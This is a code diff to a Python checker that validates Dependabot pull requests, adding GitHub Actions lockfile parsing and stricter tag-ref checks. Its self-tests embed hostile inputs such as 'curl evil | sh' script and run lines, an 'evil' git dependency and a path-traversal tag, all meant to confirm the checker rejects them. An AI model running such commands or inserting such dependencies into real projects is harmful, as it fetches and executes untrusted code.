@@ -21,8 +21,16 @@ enforces these constraints:
   New identities require crates.io and a truthy checksum, except source-less
   packages with a workspace name present in the base. Checksum validity or
   preservation is not checked.
-- GitHub Actions: only uses lines change, preserving their action and placement;
-  new refs pin a 40-hex SHA whose tag resolves upstream to the same commit.
+- GitHub Actions: only uses lines change, preserving their action and placement.
+  A tag ref (`owner/repo@vX.Y.Z`) in a workflow or .github/actions/*/action.yml
+  may change, and the head lockfile must have an entry for it (listed for that
+  workflow, or for any workflow when the file is an action.yml) with a commit
+  its tag resolves to. Every ref must move to a strictly newer plain
+  dotted-number tag; prerelease or other suffixes are rejected.
+- Workflow lockfile (.github/workflows/actions.lock): only existing actions
+  change. Each added or changed dependencies entry keeps the action's owner and
+  repo ids, is keyed by its ref or SHA, and its commit equals the commit its
+  ref resolves to upstream. Every workflow list item keeps a dependencies entry.
 
 Usage:
     python3 .github/scripts/check-dependabot-pr.py --base <sha> --head <sha>
@@ -48,15 +56,14 @@ CRATES_IO_SOURCES = {
     "sparse+https://index.crates.io/",
 }
 NAME = r"[A-Za-z0-9][\w.-]*"
-PINNED_USES = re.compile(
-    rf"^\s*(?:-\s*)?uses:\s*({NAME})/({NAME})((?:/{NAME})*)@([0-9a-f]{{40}})\s+#\s*(v?[0-9][\w.+-]*)\s*$"
-)
-USES_LINE = re.compile(rf"^\s*(?:-\s*)?uses:\s*({NAME}/{NAME}(?:/{NAME})*)@\S+(?:\s+#.*)?$")
+TAG_USES = re.compile(rf"^\s*(?:-\s*)?uses:\s*({NAME}/{NAME}(?:/{NAME})*)@(v?[0-9][\w.+-]*)\s*$")
 VERSION_REQ = re.compile(r"^[\w.^~<>=*|, +-]+$")
 NPM_FILE_SPEC = re.compile(r"^\.|\.(?:tgz|tar\.gz|tar)$", re.IGNORECASE)
 DEP_TABLES = {"dependencies", "dev-dependencies", "build-dependencies",
               "devDependencies", "optionalDependencies", "peerDependencies"}
 NPM_ALIAS = re.compile(r"npm:((?:@[^/@]+/)?[^/@]+)(?:@.+)?")
+NUMERIC_TAG = re.compile(r"v?([0-9]+(?:\.[0-9]+)*)")
+LOCKFILE = ".github/workflows/actions.lock"
 NPM_DEPS_HASH = re.compile(r'^[+-]\s*npmDepsHash = "sha256-[A-Za-z0-9+/]{43}=";$')
 
 
@@ -79,8 +86,10 @@ def classify(path):
         return "manifest"
     if path == "flake.nix":
         return "nix-hash"
+    if path == LOCKFILE:
+        return "actions-lock"
     if is_workflow_yaml(path):
-        return "actions"
+        return "workflow"
     return None
 
 
@@ -245,32 +254,115 @@ def diff_changes(diff_text):
     ]
 
 
-def check_actions(path, base_text, head_text, resolve_tag):
-    """Preserve each source line's action and placement; verify changed refs upstream."""
+def is_newer(old, new):
+    """True when both tags are plain dotted numbers and `new` is greater."""
+    keys = [NUMERIC_TAG.fullmatch(t) for t in (old, new)]
+    return None not in keys and [tuple(map(int, k[1].split("."))) for k in keys][0] < tuple(map(int, keys[1][1].split(".")))
+
+
+def check_actions(path, base_text, head_text, resolve_tag, lock):
+    """Preserve each source line's action and placement; verify changed refs.
+
+    Every ref must move to a strictly newer tag that the head lockfile (its
+    workflow lists and dependencies) has an entry for, with a commit the tag
+    resolves to. A workflow must list the ref for its own path.
+    """
     before_lines = base_text.splitlines(keepends=True)
     after_lines = head_text.splitlines(keepends=True)
     if len(before_lines) != len(after_lines):
         return [f"{path}: changes action step line counts"]
+    is_workflow = PurePosixPath(path).parent == PurePosixPath(".github/workflows")
+    listed_in = lock[0].get(path, []) if is_workflow else [i for items in lock[0].values() for i in items]
     problems = []
     for before, after in zip(before_lines, after_lines):
         if before == after:
             continue
-        old_match = USES_LINE.fullmatch(before.rstrip("\r\n"))
-        new_match = PINNED_USES.fullmatch(after.rstrip("\r\n"))
-        if old_match is None or new_match is None:
-            problems.append(f"{path}: changes a line other than a SHA-pinned uses update")
+        old_tag = TAG_USES.fullmatch(before.rstrip("\r\n"))
+        new_tag = TAG_USES.fullmatch(after.rstrip("\r\n"))
+        if not (old_tag and new_tag):
+            problems.append(f"{path}: changes a line other than a tag-ref uses update")
             continue
+        name, ref = "/".join(new_tag.group(1).split("/")[:2]).lower(), new_tag.group(2)
+        entry = lock[1].get(f"{name}@{ref}")
         if before.split("@", 1)[0] != after.split("@", 1)[0]:
             problems.append(f"{path}: changes an action or its step placement")
+        elif not is_newer(old_tag.group(2), ref):
+            problems.append(f"{path}: {name} does not move to a newer tag")
+        elif entry is None or f"{name}@{ref}" not in listed_in or entry.get("ref") != ref:
+            problems.append(f"{path}: lockfile has no entry for {name}@{ref}")
+        else:
+            problems += lock_commit_problems(path, name, ref, entry, resolve_tag)
+    return problems
+
+
+def lock_commit_problems(path, name, ref, entry, resolve_tag):
+    owner, repo = name.split("/")
+    sha = str(entry.get("commit", "")).removeprefix("sha1-")
+    try:
+        actual = resolve_tag(owner, repo, ref)
+    except Exception as e:  # noqa: BLE001 - lookup failures fail closed
+        return [f"{path}: cannot resolve {name}@{ref}: {e}"]
+    if actual != sha:
+        return [f"{path}: {name} {ref} is {actual}, lockfile pins {sha}"]
+    return []
+
+
+def parse_lock(text):
+    """Split actions.lock into top-level scalars, workflow item lists and dependency entries."""
+    top, sections, section, entry, field = {}, {}, None, None, None
+    for line in text.splitlines():
+        content = line.strip()
+        if not content or content.startswith("#"):
             continue
-        owner, repo, _subpath, sha, tag = new_match.groups()
-        try:
-            actual = resolve_tag(owner, repo, tag)
-        except Exception as e:  # noqa: BLE001 - lookup failures fail closed
-            problems.append(f"{path}: cannot resolve {owner}/{repo}@{tag}: {e}")
+        indent = len(line) - len(line.lstrip(" "))
+        item = content[2:].strip("'") if content.startswith("- ") else None
+        key, _, value = content.partition(":")
+        key, value = key.strip("'"), value.strip().strip("'")
+        if indent == 0 and item is None:
+            if value:
+                top[key] = value
+            else:
+                section = sections.setdefault(key, {})
+        elif indent == 4 and item is None:
+            entry = section.setdefault(key, [] if sections.get("workflows") is section else {})
+        elif indent == 8 and item is not None:
+            entry.append(item)
+        elif indent == 8:
+            entry[key] = value if value else []
+            field = key
+        elif indent == 12 and item is not None:
+            entry[field].append(item)
+        else:
+            raise ValueError(f"unexpected line {content!r}")
+    return top, sections.get("workflows", {}), sections.get("dependencies", {})
+
+
+def check_actions_lock(path, base_text, head_text, resolve_tag):
+    """Allow only ref and commit updates for existing actions; verify commits upstream."""
+    try:
+        (base_top, base_wf, base_deps), (top, wf, deps) = parse_lock(base_text), parse_lock(head_text)
+    except Exception as e:  # noqa: BLE001 - unparseable lockfiles fail closed
+        return [f"{path}: cannot parse: {e}"]
+    problems = []
+    if (base_top, set(base_wf)) != (top, set(wf)):
+        problems.append(f"{path}: changes more than action references")
+    known = {key.split("@")[0]: (e.get("owner_id"), e.get("repo_id")) for key, e in base_deps.items()}
+    for items in wf.values():
+        problems += [f"{path}: {i} is not an existing action" for i in items if i.split("@")[0] not in known]
+        problems += [f"{path}: {i} has no dependencies entry" for i in items if i not in deps]
+    for key, entry in deps.items():
+        if entry == base_deps.get(key):
             continue
-        if actual != sha:
-            problems.append(f"{path}: {owner}/{repo} {tag} is {actual}, PR pins {sha}")
+        name, _, pin = key.partition("@")
+        sha = str(entry.get("commit", "")).removeprefix("sha1-")
+        if name not in known:
+            problems.append(f"{path}: {key} is not an existing action")
+        elif (entry.get("owner_id"), entry.get("repo_id")) != known[name]:
+            problems.append(f"{path}: {key} changes the action's owner or repo id")
+        elif not re.fullmatch("[0-9a-f]{40}", sha) or pin not in (entry.get("ref"), sha):
+            problems.append(f"{path}: {key} is not keyed by its ref or commit")
+        else:
+            problems += lock_commit_problems(path, "/".join(name.split("/")[:2]), entry["ref"], entry, resolve_tag)
     return problems
 
 
@@ -297,8 +389,14 @@ def check(changed, read, diff, resolve_tag):
             problems += check_cargo_lock(path, read("base", path), read("head", path))
         elif kind == "manifest":
             problems += check_manifest(path, read("base", path), read("head", path))
-        elif kind == "actions":
-            problems += check_actions(path, read("base", path), read("head", path), resolve_tag)
+        elif kind == "workflow":
+            try:
+                lock = parse_lock(read("head", LOCKFILE))[1:]
+            except Exception:  # noqa: BLE001 - a missing or broken lockfile pins nothing
+                lock = ({}, {})
+            problems += check_actions(path, read("base", path), read("head", path), resolve_tag, lock)
+        elif kind == "actions-lock":
+            problems += check_actions_lock(path, read("base", path), read("head", path), resolve_tag)
         elif kind == "nix-hash":
             problems += check_nix_hash_diff(path, diff(path))
     return problems
@@ -444,20 +542,31 @@ def self_test():
     pkg_json = json.dumps({"name": "web", "scripts": {"build": "vite build"}, "dependencies": {"left-pad": "^1.0.0"}})
 
     def resolver(owner, repo, tag):
-        return {"v2.0.0": sha_a, "v3.0.0": sha_c}[tag]
+        return {"v1.0.0": sha_b, "v2.0.0": sha_a, "v2.0.0-beta.1": sha_a, "v3.0.0": sha_c}[tag]
 
-    old_co = f"      - uses: actions/checkout@{sha_b} # v1.0.0\n"
-    new_co = f"      - uses: actions/checkout@{sha_a} # v2.0.0\n"
-    old_cache = f"      - uses: Swatinem/rust-cache@{sha_b} # v1.0.0\n"
-    new_cache = f"      - uses: Swatinem/rust-cache@{sha_a} # v2.0.0\n"
-    latest_co = f"      - uses: actions/checkout@{sha_c} # v3.0.0\n"
+    old_co = "      - uses: actions/checkout@v1.0.0\n"
+    new_co = "      - uses: actions/checkout@v2.0.0\n"
     nix_old = '-  npmDepsHash = "sha256-' + "A" * 43 + '=";\n'
     nix_new = '+  npmDepsHash = "sha256-' + "B" * 43 + '=";\n'
     lock = "web/package-lock.json"
     wf = ".github/workflows/ci.yml"
 
-    def action_case(name, before, after, expected, path=wf):
-        return name, [path], {path: (before, after)}, "", expected
+    def lock_text(ref="v1.0.0", sha=sha_b, owner_id=1, extra=""):
+        return (
+            "version: 'v0.0.3'\nworkflows:\n    '.github/workflows/ci.yml':\n"
+            f"        - 'actions/checkout@{ref}'\ndependencies:\n"
+            f"    'actions/checkout@{ref}':\n        ref: '{ref}'\n        commit: 'sha1-{sha}'\n"
+            f"        owner_id: {owner_id}\n        repo_id: 2\n        uses:\n            - 'x/y@z'\n{extra}"
+        )
+
+    old_tag, new_tag = old_co, new_co
+    action_yml = ".github/actions/x/action.yml"
+    lockfile = ".github/workflows/actions.lock"
+
+    def wf_case(name, before, after, expected, base_lock=None, head_lock=None, path=wf):
+        base_lock = lock_text() if base_lock is None else base_lock
+        head_lock = lock_text("v2.0.0", sha_a) if head_lock is None else head_lock
+        return name, [path, lockfile], {path: (before, after), lockfile: (base_lock, head_lock)}, "", expected
 
     cases = [
         ("npm registry bump", [lock], {lock: (npm_base, npm_head(**{"left-pad": good_entry}))}, "", 0),
@@ -491,26 +600,45 @@ def self_test():
         ("npm manifest bump", ["web/package.json"], {"web/package.json": (pkg_json, pkg_json.replace("^1.0.0", "^1.1.0"))}, "", 0),
         ("npm manifest script", ["web/package.json"], {"web/package.json": (pkg_json, pkg_json.replace("vite build", "curl evil | sh"))}, "", 1),
         ("npm manifest git dep", ["web/package.json"], {"web/package.json": (pkg_json, pkg_json.replace("^1.0.0", "github:evil/left-pad"))}, "", 1),
-        action_case("actions matching tag", old_co, new_co, 0),
-        action_case("actions subpath", f"    - uses: github/codeql-action/init@{sha_b} # v1.0.0\n", f"    - uses: github/codeql-action/init@{sha_a} # v2.0.0\n", 0, ".github/actions/x/action.yml"),
-        action_case("actions mismatched tag", old_co, f"      - uses: actions/checkout@{sha_b} # v2.0.0\n", 1),
-        action_case("actions unknown tag", old_co, f"      - uses: actions/checkout@{sha_a} # v9\n", 1),
-        action_case("actions unpinned", old_co, "      - uses: actions/checkout@v2\n", 1),
-        action_case("actions other repo", old_co, f"      - uses: evil/checkout@{sha_a} # v2.0.0\n", 1),
-        action_case("actions extra run line", old_co, new_co + "      - run: curl evil | sh\n", 1),
-        action_case("actions removed step", "      - run: cargo deny check\n", "", 1),
-        action_case("actions traversal tag", old_co, f"      - uses: actions/checkout@{sha_a} # v2/../../evil\n", 1),
-        action_case("actions adjacent updates", old_co + old_cache, new_co + new_cache, 0),
-        action_case("actions separated updates", old_co + "      - run: true\n" + old_cache, new_co + "      - run: true\n" + new_cache, 0),
-        action_case("actions repeated action updates", old_co + old_co, new_co + new_co, 0),
-        action_case("actions overlapping repeated refs", old_co + new_co, new_co + latest_co, 0),
-        action_case("actions unchanged local action", old_co + "      - uses: ./.github/actions/rust-toolchain\n", new_co + "      - uses: ./.github/actions/rust-toolchain\n", 0),
-        action_case("actions swapped between steps", old_co + old_cache, new_cache + new_co, 1),
-        action_case("actions same action moved", old_co + "      - run: true\n", "      - run: true\n" + new_co, 1),
-        action_case("actions indentation change", old_co, "  " + new_co, 1),
-        action_case("actions step dash removed", old_co, new_co.replace("- uses:", "uses:"), 1),
-        action_case("actions added step", old_co, new_co + new_co, 1),
-        action_case("actions binary source", old_co, new_co + chr(0), 1),
+        wf_case("workflow tag bump", old_tag, new_tag, 0),
+        wf_case("workflow tag bump with unchanged local action", old_tag + "      - uses: $/.github/actions/x\n", new_tag + "      - uses: $/.github/actions/x\n", 0),
+        wf_case("workflow tag downgrade", new_tag, old_tag, 1, lock_text("v2.0.0", sha_a), lock_text()),
+        wf_case("workflow tag mixed-case owner", *(f"      - uses: EmbarkStudios/cargo-deny-action@{t}\n" for t in ("v1.0.0", "v2.0.0")), 0, *(lock_text(*a).replace("actions/checkout", "embarkstudios/cargo-deny-action") for a in ((), ("v2.0.0", sha_a)))),
+        wf_case("workflow tag numeric-equal suffix", old_tag, old_tag.replace("v1.0.0", "v1.0.0-rc"), 1),
+        wf_case("workflow tag to prerelease", old_tag, "      - uses: actions/checkout@v2.0.0-beta.1\n", 1, lock_text(), lock_text("v2.0.0-beta.1", sha_a)),
+        wf_case("workflow release to prerelease", new_tag, "      - uses: actions/checkout@v2.0.0-beta.1\n", 1, lock_text("v2.0.0", sha_a), lock_text("v2.0.0-beta.1", sha_a)),
+        wf_case("workflow tag other action", old_tag, "      - uses: evil/checkout@v2.0.0\n", 1),
+        wf_case("workflow tag to branch", old_tag, "      - uses: actions/checkout@main\n", 1),
+        wf_case("workflow tag to SHA without comment", old_tag, f"      - uses: actions/checkout@{sha_a}\n", 1),
+        wf_case("workflow tag without lockfile entry", old_tag, new_tag, 1, lock_text(), lock_text()),
+        wf_case("workflow tag lockfile commit mismatch", old_tag, new_tag, 1, lock_text(), lock_text("v2.0.0", sha_b)),
+        wf_case("workflow tag not listed for workflow", old_tag, new_tag, 1, lock_text(), lock_text("v2.0.0", sha_a).replace("        - 'actions/checkout@v2.0.0'\n", "")),
+        ("workflow tag with unreadable lockfile", [wf], {wf: (old_tag, new_tag)}, "", 1),
+        ("lockfile drops referenced entry", [lockfile], {lockfile: (lock_text(), lock_text().split("dependencies:")[0] + "dependencies:\n")}, "", 1),
+        wf_case("action file tag bump", old_tag, new_tag, 0, path=action_yml),
+        wf_case("action file subpath tag bump", "    - uses: actions/checkout/sub@v1.0.0\n", "    - uses: actions/checkout/sub@v2.0.0\n", 0, path=action_yml),
+        wf_case("action file tag downgrade", new_tag, old_tag, 1, lock_text("v2.0.0", sha_a), lock_text(), path=action_yml),
+        wf_case("action file tag without lockfile entry", old_tag, new_tag, 1, lock_text(), lock_text(), path=action_yml),
+        wf_case("action file tag lockfile commit mismatch", old_tag, new_tag, 1, lock_text(), lock_text("v2.0.0", sha_b), path=action_yml),
+        wf_case("action file SHA pin", old_tag, f"      - uses: actions/checkout@{sha_a} # v2.0.0\n", 1, path=action_yml),
+        wf_case("action file other action", old_tag, "      - uses: evil/checkout@v2.0.0\n", 1, path=action_yml),
+        wf_case("action file extra run line", old_tag, new_tag + "      - run: curl evil | sh\n", 1, path=action_yml),
+        wf_case("action file removed step", "      - run: cargo deny check\n", "", 1, path=action_yml),
+        wf_case("action file repeated action updates", old_tag + old_tag, new_tag + new_tag, 0, path=action_yml),
+        wf_case("action file unchanged local action", old_tag + "      - uses: $/.github/actions/x\n", new_tag + "      - uses: $/.github/actions/x\n", 0, path=action_yml),
+        wf_case("action file swapped between steps", old_tag + "      - run: true\n", "      - run: true\n" + new_tag, 1, path=action_yml),
+        wf_case("action file indentation change", old_tag, "  " + new_tag, 1, path=action_yml),
+        wf_case("action file binary source", old_tag, new_tag + chr(0), 1, path=action_yml),
+        ("lockfile bump", [lockfile], {lockfile: (lock_text(), lock_text("v2.0.0", sha_a))}, "", 0),
+        ("lockfile unchanged entry skips upstream", [lockfile], {lockfile: (lock_text(), lock_text() + "# note\n")}, "", 0),
+        ("lockfile mismatched commit", [lockfile], {lockfile: (lock_text(), lock_text("v2.0.0", sha_b))}, "", 1),
+        ("lockfile unknown tag", [lockfile], {lockfile: (lock_text(), lock_text("v9.9.9", sha_a))}, "", 1),
+        ("lockfile key and ref differ", [lockfile], {lockfile: (lock_text(), lock_text("v2.0.0", sha_a).replace("        ref: 'v2.0.0'", "        ref: 'v3.0.0'"))}, "", 1),
+        ("lockfile owner id change", [lockfile], {lockfile: (lock_text(), lock_text("v2.0.0", sha_a, owner_id=9))}, "", 1),
+        ("lockfile new action", [lockfile], {lockfile: (lock_text(), lock_text() + "    'evil/x@v2.0.0':\n        ref: 'v2.0.0'\n        commit: 'sha1-" + sha_a + "'\n        owner_id: 1\n        repo_id: 2\n")}, "", 1),
+        ("lockfile new workflow", [lockfile], {lockfile: (lock_text(), lock_text("v2.0.0", sha_a).replace("workflows:\n", "workflows:\n    '.github/workflows/evil.yml':\n        - 'actions/checkout@v2.0.0'\n"))}, "", 1),
+        ("lockfile version change", [lockfile], {lockfile: (lock_text(), lock_text("v2.0.0", sha_a).replace("v0.0.3", "v9"))}, "", 1),
+        ("lockfile malformed", [lockfile], {lockfile: (lock_text(), "version: 'v0.0.3'\n  junk\n")}, "", 1),
         ("deleted workflow", [("D", wf)], {}, "", 1),
         ("nix hash only", ["flake.nix"], {}, nix_old + nix_new, 0),
         ("nix duplicate hash additions", ["flake.nix"], {}, nix_new + nix_new, 1),
